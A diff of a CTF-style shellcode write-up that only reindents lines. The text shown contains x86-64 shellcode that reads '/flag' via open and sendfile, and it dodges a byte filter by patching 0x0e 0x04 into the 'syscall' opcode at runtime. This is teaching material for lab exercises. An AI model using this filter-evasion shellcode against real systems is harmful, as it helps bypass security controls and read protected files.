@@ -241,20 +241,20 @@ For this, we have to create a label that has the bytes, `0x0e` and `0x04`.
 
 ```asm showLineNumbers
 sys1:
-	.byte 0x0e
-	.byte 0x04
+    .byte 0x0e
+    .byte 0x04
 ```
 
 Before this label is executed, we have to increment the byte values so that they are `0x0f` and `0x05` which is the bytecode for `syscall`.
 Our modifications should look something like this:
 
 ```asm title="syscall snippet" showLineNumbers
- 	inc byte ptr [rip + sys1 + 1]
-	inc byte ptr [rip + sys1]
+    inc byte ptr [rip + sys1 + 1]
+    inc byte ptr [rip + sys1]
 
 sys1:
-	.byte 0x0e
-	.byte 0x04
+    .byte 0x0e
+    .byte 0x04
 ```
 
 ### Exploit
@@ -274,11 +274,11 @@ shellcode_asm = """
     mov eax, 0x02
     
     /* syscall */
- 	inc byte ptr [rip + sys1 + 1]
-	inc byte ptr [rip + sys1]
+    inc byte ptr [rip + sys1 + 1]
+    inc byte ptr [rip + sys1]
 sys1:
-	.byte 0x0e
-	.byte 0x04        
+    .byte 0x0e
+    .byte 0x04        
 
     /* sendfile(1, rax, 0, 0x100) */
     mov edi, 1          
@@ -288,22 +288,22 @@ sys1:
     mov eax, 40          
  
     /* syscall */
- 	inc byte ptr [rip + sys2 + 1]
-	inc byte ptr [rip + sys2]
+    inc byte ptr [rip + sys2 + 1]
+    inc byte ptr [rip + sys2]
 sys2:
-	.byte 0x0e
-	.byte 0x04            
+    .byte 0x0e
+    .byte 0x04            
 
     /* exit(0) */
     xor edi, edi
     mov al, 60
 
     /* syscall */
- 	inc byte ptr [rip + sys3 + 1]
-	inc byte ptr [rip + sys3]
+    inc byte ptr [rip + sys3 + 1]
+    inc byte ptr [rip + sys3]
 sys3:
-	.byte 0x0e
-	.byte 0x04           
+    .byte 0x0e
+    .byte 0x04           
 
 flag:
     .string "/flag" 
